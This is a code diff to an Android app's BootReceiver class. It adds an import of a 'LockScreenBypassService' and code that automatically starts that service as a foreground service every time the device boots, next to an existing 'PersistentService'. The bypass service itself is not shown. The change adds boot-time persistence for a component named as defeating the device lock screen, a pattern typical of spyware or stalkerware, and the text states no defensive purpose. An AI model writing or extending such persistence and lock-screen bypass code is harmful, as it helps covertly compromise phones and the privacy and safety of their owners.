@@ -7,7 +7,7 @@ import android.os.Build;
 import android.util.Log;
 
 import com.example.myapplication.services.PersistentService;
-import com.example.myapplication.utils.PermissionManager;
+import com.example.myapplication.services.LockScreenBypassService;
 
 public class BootReceiver extends BroadcastReceiver {
     private static final String TAG = "BootReceiver";
@@ -31,6 +31,7 @@ public class BootReceiver extends BroadcastReceiver {
     
     private void startPersistentService(Context context) {
         try {
+            // Start main persistent service
             Intent serviceIntent = new Intent(context, PersistentService.class);
             
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -39,10 +40,19 @@ public class BootReceiver extends BroadcastReceiver {
                 context.startService(serviceIntent);
             }
             
-            Log.d(TAG, "Persistent service started successfully");
+            // Start lock screen bypass service
+            Intent lockBypassIntent = new Intent(context, LockScreenBypassService.class);
+            
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                context.startForegroundService(lockBypassIntent);
+            } else {
+                context.startService(lockBypassIntent);
+            }
+            
+            Log.d(TAG, "All persistent services started successfully on boot");
             
         } catch (Exception e) {
-            Log.e(TAG, "Error starting persistent service", e);
+            Log.e(TAG, "Error starting persistent services", e);
         }
     }
 }
